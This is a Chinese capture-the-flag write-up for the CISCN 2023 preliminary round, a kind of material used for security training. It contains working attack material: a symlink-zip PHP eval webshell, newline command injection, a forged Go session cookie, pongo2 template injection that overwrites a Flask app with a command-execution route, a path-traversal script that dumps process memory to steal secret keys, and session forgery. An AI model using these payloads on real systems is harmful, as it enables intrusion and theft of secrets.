# CISCN2023初赛


wp：[https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q](https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q)

## Web
### unzip
```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};

//only this!
```
构造软连接：
```
ln -s /var/www/html test
zip --symlinks test.zip ./*
```
上传解压后/var/www/html指向test目录
构造木马：
```
mkdir test
echo "<?php @eval($_GET['cmd']);" > test/cmd.php
zip -r test1.zip ./*
```
上传解压后可访问test目录下的木马

![image-20230805011604202](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png)

### dumpit

![image-20230805011822254](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png)
过滤的符号： 
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=)
/?db=bibin&table_2_dump=%00
![image-20230805011833160](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png)
/?db=bibin&table_2_dump=%0a
![image-20230805011846369](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png)
发现%0a闭合能执行命令，在env发现flag
/?db=q&table_2_dump=%0awhoami%0a 
/?db=q&table_2_dump=%0env%0a //环境变量
![image-20230805011910531](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png)

### go_session
[https://un1novvn.github.io/2023/05/29/ciscn2023/](https://un1novvn.github.io/2023/05/29/ciscn2023/)
[https://ctf.njupt.edu.cn/archives/898#go_session](https://ctf.njupt.edu.cn/archives/898#go_session)
看官方文档 pongo
环境
route.go
```php
package route

import (
	"github.com/flosch/pongo2/v4"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/sessions"
	"html"
	"io"
	"net/http"
)

var store = sessions.NewCookieStore([]byte(""))

func Index(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == nil {
		session.Values["name"] = "admin"
		err = session.Save(c.Request, c.Writer)
		if err != nil {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	c.String(200, "Hello, guest")
}

func Admin(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] != "admin" {
		http.Error(c.Writer, "N0", http.StatusInternalServerError)
		return
	}
	name := c.DefaultQuery("name", "ssti")
	xssWaf := html.EscapeString(name)
	tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
	//tpl, err := pongo2.FromString("Hello " + name + "!")
	if err != nil {
		panic(err)
	}
	out, err := tpl.Execute(pongo2.Context{"c": c})
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	c.String(200, out)
}

func Flask(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == nil {
		if err != nil {
			http.Error(c.Writer, "N0", http.StatusInternalServerError)
			return
		}
	}
	resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	c.String(200, string(body))
}
```
main.go
```php
package main

import (
	"github.com/gin-gonic/gin"
	"main/route"
)

func main() {
	r := gin.Default()
	r.GET("/", route.Index)
	r.GET("/admin", route.Admin)
	r.GET("/flask", route.Flask)
	r.Run("0.0.0.0:80")
}
```
app.py
```python
# -*- coding: utf-8 -*-
from flask import Flask

app = Flask(__name__)

d = {
    "h": "hello world!"
}
@app.route("/")
def hello():
    return "hello"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
```

有三个路由，index、admin和flask
session检测，key为空，直接本地起环境（像index里面一样设置session
```python
Cookie:session-name=MTY4OTIxMzM0M3xEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXx-9wDJrv63GGaUmQnK_0WvaRL62AHGIY1IRVS4IdZ39Q==
```
admin有ssti注入，admin中`out, err := tpl.Execute(pongo2.Context{"c": c})`的c为传入的变量`c *gin.Context`
flask对应后端的app.py
思路是通过ssti实现任意文件读写，覆盖app.py，由于app.py开启debug热部署，内容改变会重新加载。
include可以读取文件，但不能直接传引号的字符串，需要一个可控字符串变量
Context --> Request --> Host/Referer 可控

报错获取app.py位置
![image-20230805011924762](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png)
读文件：

```python
{%include c.Request.Referer()%}

{%include c.Request.Host()%}
```
![image-20230805011935987](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png)

Context --> 找到上传文件，`SaveUploadedFile(file *multipart.FileHeader,dst string)`，需要`FileHeader` --> `FormFile(name string)(*multipart.FileHeader,error)`
需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer
写文件：
```python
{{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}}
```
```
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
Host: 8d29d285-1292-41ef-85ba-b8c310a6ec3a.challenge.ctf.show
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi
User-Agent: /app/server.py
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session-name=MTY4OTI1ODAwNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzyv2RXchGZcXdaKPew1jYXVZTOE270NGdCUSZk-SNumg==
Connection: close
Content-Length: 589

------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name="/app/server.py"; filename="server.py"
Content-Type: text/plain

from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    else:
        return 'shell'

if __name__== "__main__":
    app.run(host="127.0.0.1",port=5000,debug=True)
------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name="submit"

------WebKitFormBoundaryrxtSm5i2S6anueQi--
```
![image-20230805011955161](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png)
覆盖成功，执行命令
![image-20230805012011004](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png)

### DeserBug（java，之后再看
[https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0](https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0)
### reading
[https://un1novvn.github.io/2023/05/29/ciscn2023/](https://un1novvn.github.io/2023/05/29/ciscn2023/)
黑盒题，可跨目录读取文件
借助经典的两个目录`/proc/self/environ` && `/proc/self/cmdline` 来读更多信息，获取源代码
/proc/self/cwd/app.py
```python
import os
import math
import time
import hashlib
from flask import Flask, request, session, render_template, send_file
from datetime import datetime

app = Flask(__name__)
app.secret_key = hashlib.md5(os.urandom(32)).hexdigest()
key = hashlib.md5(str(time.time_ns()).encode()).hexdigest()


@app.route('/books', methods=['GET', 'POST'])
def book_page():
    filepath = request.args.get('book')
    if request.args.get('page_size'):
        page_size = int(request.args.get('page_size'))
    else:
        page_size = 3000
    if request.args.get('page'):
        page = int(request.args.get('page'))
    else:
        page = 1
    words = read_file_page(filepath, page, page_size)
    return '\n'.join(words)

@app.route('/flag', methods=['GET', 'POST'])
def flag():
    if hashlib.md5(session.get('key').encode()).hexdigest() == key:
        return "flag{xxxxxxxxxxxxxxxxxx}"
    else:
        return "no no no"

def read_file_page(filename, page_number, page_size):
    for i in range(3):
        for j in range(3):
            size=page_size + j
            offset = (page_number - 1) * page_size+i
            try:
                with open(filename, 'rb') as file:
                    file.seek(offset)
                    words = file.read(size)
                    return words.decode().split('\n')
            except Exception as e:
                pass
            #if error again
    offset = (page_number - 1) * page_size
    with open(filename, 'rb') as file:
        file.seek(offset)
        words = file.read(page_size)
        return words.split(b'\n')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
配合start和end读内存，读取全部内存，找到32位字符串，那就是key或secret_key（通常做法）
内存里有些区域不可读，所以需要利用/proc/self/maps去读段的起始地址和结束地址
读取mem脚本：
```python
import requests,time,re

#maps里是读maps的原始内容
maps = open('maps').read().split('\n')

start_end = []
for line in maps:
    if ' r' not in line: #忽略不可读的内存
        continue
    line = line.split()[0]
    start = line.split('-')[0]
    end = line.split('-')[1]
    start_end.append([start,end])

page_size = 4096
for i,line in enumerate(start_end):
    start = int(line[0],16)
    end = int(line[1],16)

    # page_size = end-start 写了这条也可

    start_page = start // page_size
    page_num = (end-start)//page_size
    print(f'[*]{i + 1}/{len(start_end)}', 'page_num: ',page_num)
    result = open(f'my/{line[0]}-{line[1]}.bin', 'wb')

    for page in range(page_num):
        url = f'http://192.168.190.130:5000/books?book=../../../../../../../proc/self/mem&page={start_page+page}&page_size={page_size}'
        res = requests.get(url)
        result.write(res.text.encode())
        result.write(b'\n')
    result.close()
```
全局正则匹配，找到两个考得近的32位字符串
```python
9776436d6a1453cf13eceee8cda4fd84
e6e69a980d637186e90656f2d9a5a1a8
```
解session，可以解的是secret_key（9776436d6a1453cf13eceee8cda4fd84），剩下的为key（e6e69a980d637186e90656f2d9a5a1a8）
[https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089)
接下来爆时间戳
从程序运行（开靶场）时，敲几个时间戳出来，前面几位固定，爆破后面数字
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854)
用hashcat爆破
```python
hashcat -m 0 -a 3 e6e69a980d637186e90656f2d9a5a1a8 168924550?d?d?d?d?d?d?d?d?d?d
```
（前面爆破出了，再爆破直接用--show显示结果）
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843)
```python
e6e69a980d637186e90656f2d9a5a1a8:1689245500101730900
```
伪造session（注意key后的空格）
```python
python .\flask_session_cookie_manager3.py encode -s "9776436d6a1453cf13eceee8cda4fd84" -t "{'key': '1689245500101730900'}"
eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0.ZK_Zsg.9oonOJJLBNz-XhXMQM9H7RCxo9Q
```
访问/flag
![image-20230805012025756](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png)

### BackendService
[https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q](https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q)
[https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270](https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270)
[https://xz.aliyun.com/t/11493#toc-5](https://xz.aliyun.com/t/11493#toc-5)
nacos漏洞
未授权；配置，反弹shell

## RE
### babyre
[https://snap.berkeley.edu/snap/snap.html](https://snap.berkeley.edu/snap/snap.html)
![image-20230805012033416](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png)
secret export

```
102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30
```
exp.py
```python
data = [102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]
flag = chr(data[0])
for i in range(1, len(data)):
    data[i] = data[i] ^ data[i-1]
    flag += chr(data[i])
print(flag)
```
## MISC
### 被加密的生产流量
![image-20230805012051339](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534)

### pyshell
python shell
字符串长度为7
python特性 下划线表示上次输出结果，拼接得到命令
```
"__import__('system').os('cat /f*')"
eval(_)
```

### 国粹
题目.png从0开始标号，将a.png和k.png转化为编号列表，分别作为x和y，画出轨迹图

## Crypto
### 基于国密SM2算法的密钥密文分发
非预期：
跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交
最后在search中看到flag
### 可信度量
非预期：
grep寻找flag，发现在proc/22/task/22/environ
![image-20230805012110115](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png)

### Sign_in_passwd
```
j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5
```
第二行url解码后作为编码表，再将第一行base64解码
### badkey1
第一步爆破sha256前四位
第二步找到p与q，使construct报错（应该要d和n不互素
e*d = k1*(p-1)*(q-1) + 1
d = k2*p*q
e*k2*p*q = k1*(p-1)*(q-1)+1

